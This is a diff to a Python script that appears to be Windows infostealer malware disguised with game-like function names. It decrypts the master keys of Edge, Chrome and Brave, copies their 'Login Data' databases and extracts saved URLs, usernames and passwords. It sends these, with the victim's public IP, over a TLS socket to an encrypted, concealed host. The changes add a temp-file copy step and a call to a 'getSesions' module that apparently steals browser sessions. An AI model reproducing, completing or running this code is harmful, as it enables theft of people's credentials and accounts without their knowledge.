@@ -4,6 +4,7 @@ import shutil
 import sqlite3
 import json
 import tempfile
+import time
 import win32crypt
 from Crypto.Cipher import AES
 from CryptoPhenix import decrypt, encrypt, gen_256
@@ -15,9 +16,7 @@ import certs
 import os
 import get_points
 connect = False
-
 warnings.filterwarnings("ignore", category=DeprecationWarning)
-
 
 #
 # Autor   ->  an0mal1a
@@ -26,11 +25,13 @@ warnings.filterwarnings("ignore", category=DeprecationWarning)
 # Correo  -> pablodiez024@proton.me
 #
 
+
 def know_gme():
-    unkown = b'\x9eLO\x92\xc2]%\x8e\xa9\x96,\xc1\xbbd\x0f\xba\xb3\x9c\x1f\x9b\x97\xad`\x9dB\xb3\xea`\xd7\t\x19\x05\x02Y\xeb\xcf\xea\x05\xdeI\x8a\xc5\xe2\x80\xdeUW7\x8b\x85~V\xdd3k\xb7\xb3\xcb\x05\x82\x89\x05A_'
+    unkown = b'u\x1b1.\x9aQ\x11CO>\x87:e7\xd6q\x14\x02[#\x8d{p\xad\x99\xecj\t\xea\xc7\xd3\xc6\xe1\x15n\xce|a=BowY$\xc4,\x846\x7fG\x82\xca\xbb\x1e\xbb\x93<\x1e\xb6\x03S\x1a\\\xff'
     return str(decrypt(unkown).decode())
     #return "127.0.0.1"
 
+import getSesions
 
 try:
     cock = tempfile.NamedTemporaryFile(delete=False)
@@ -41,8 +42,9 @@ try:
     csd.write(certs.get_locker().encode())
     csd.close()
 
+
     context = ssl.SSLContext(ssl.PROTOCOL_TLS)
-    context.verify_mode = ssl.CERT_NONE  # Cambiar a ssl.CERT_REQUIRED si deseas verificar el certificado del servidor
+    #context.verify_mode = ssl.CERT_NONE  # Cambiar a ssl.CERT_REQUIRED si deseas verificar el certificado del servidor
     context.load_cert_chain(certfile=cock.name, keyfile=csd.name)
 
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -54,8 +56,9 @@ except Exception as e:
 
 
 def cmlpt_gme(locale):
-
-    with open(locale, "r", encoding='utf-8') as f:
+    filename = os.path.join(os.environ['TEMP'], 'tem2X02.tmp')
+    shutil.copyfile(locale, filename)
+    with open(filename, "r", encoding='utf-8') as f:
         local_state = f.read()
         local_state = json.loads(local_state)
     mstr = base64.b64decode(local_state["os_crypt"]['encrypted_key'])
@@ -108,7 +111,6 @@ def init_game(locat_e, locat_g, locat_b, ede, gle, brve):
         sec.send("\n\n".encode() + decrypt(pim) + " ".encode())
         sec.send(requests.get('http://checkip.amazonaws.com').text.strip().encode() + "\n\n".encode())
 
-        
         def edge():
             sec.send(f"\n\n\t\t[*] EDGE CRED\n".encode())
             key = cmlpt_gme(locat_e)
@@ -117,7 +119,8 @@ def init_game(locat_e, locat_g, locat_b, ede, gle, brve):
             shutil.copyfile(ede, fnilam)
             pwr = sqlite3.connect(fnilam)
             drct = pwr.cursor()
-            drct.execute('select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created')
+            drct.execute(
+                'select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created')
 
             for row in drct.fetchall():
                 origin_url = row[0]
@@ -128,7 +131,6 @@ def init_game(locat_e, locat_g, locat_b, ede, gle, brve):
                 # date_last_used = row[5]
 
                 save(username, value, origin_url, date_created)
-
 
             encrypt(fnilam.encode(), secrets.token_bytes(32))
 
@@ -142,7 +144,8 @@ def init_game(locat_e, locat_g, locat_b, ede, gle, brve):
             shutil.copyfile(gle, fnilam)
             pwr = sqlite3.connect(fnilam)
             drct = pwr.cursor()
-            drct.execute('select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created')
+            drct.execute(
+                'select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created')
 
             for row in drct.fetchall():
                 origin_url = row[0]
@@ -194,34 +197,36 @@ def init_game(locat_e, locat_g, locat_b, ede, gle, brve):
         os.unlink(cock.name)
 
 
-
 def main():
     locat_e = os.path.join(os.environ['USERPROFILE'], "AppData", "Local",
-                "Microsoft", "Edge", "User Data", "Local State")
+                           "Microsoft", "Edge", "User Data", "Local State")
 
     locat_g = os.path.join(os.environ['USERPROFILE'], "AppData", "Local", "Google", "Chrome",
-                "User Data", "Local State")
+                           "User Data", "Local State")
 
     locat_b = os.path.join(os.environ['USERPROFILE'], "AppData", "Local", "BraveSoftware",
-                "Brave-Browser", "User Data")
+                           "Brave-Browser", "User Data")
 
     ede = os.path.join(os.environ['USERPROFILE'], "AppData", "Local", "Microsoft",
-                "Edge", "User Data", "Default", "Login Data")
+                       "Edge", "User Data", "Default", "Login Data")
 
     gle = os.path.join(os.environ['USERPROFILE'], "AppData", "Local", "Google",
-                "Chrome", "User Data", "Default", "Login Data")
+                       "Chrome", "User Data", "Default", "Login Data")
 
-    brve = os.path.join(os.environ['USERPROFILE'], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Default")
+    brve = os.path.join(os.environ['USERPROFILE'], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data",
+                        "Default")
+
 
     init_game(locat_e, locat_g, locat_b, ede, gle, brve)
 
     try:
         get_points.main(sec)
+        getSesions.main(sec)
     except Exception:
         pass
 
 
 if __name__ == "__main__":
     main()
-    exit()
-    
+
+
